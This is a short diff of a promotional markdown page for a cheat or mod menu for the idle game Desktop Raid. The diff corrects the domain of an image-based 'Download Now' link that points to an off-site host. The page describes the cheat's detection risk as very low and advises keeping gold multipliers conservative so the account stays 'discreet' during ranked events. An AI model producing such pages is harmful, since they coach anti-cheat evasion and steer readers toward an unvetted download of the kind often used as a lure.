@@ -16,7 +16,7 @@ The March 19, 2026 update for Desktop Raid focused on visual equipment refinemen
 
 This version recovered quickly thanks to robust dynamic pattern scanning. In my analysis, core modules remain highly stable with minimal system overhead, making it ideal for background idle runs even on multi-monitor setups. Detection risk is very low in single-player offline-style sessions, as the game applies limited server-side validation for this primarily client-driven idle experience. On accounts with cloud saves or leaderboard elements, overly aggressive usage (such as extreme gold multipliers during ranked events) could draw attention, but conservative settings keep the profile discreet. The mod menu performs only client-side reads and writes, avoiding any direct server interaction.
 
-<a href="https://desr.git-portal.com.com/" target="_blank" rel="noopener"><img src="https://i.pinimg.com/originals/4f/ef/a6/4fefa69a6b6dc356246858050ac41d47.png" alt="Download Now"></a>
+<a href="https://desr.git-portal.com/" target="_blank" rel="noopener"><img src="https://i.pinimg.com/originals/4f/ef/a6/4fefa69a6b6dc356246858050ac41d47.png" alt="Download Now"></a>
 
 ### Reliable Features Holding Strong in March 2026
 
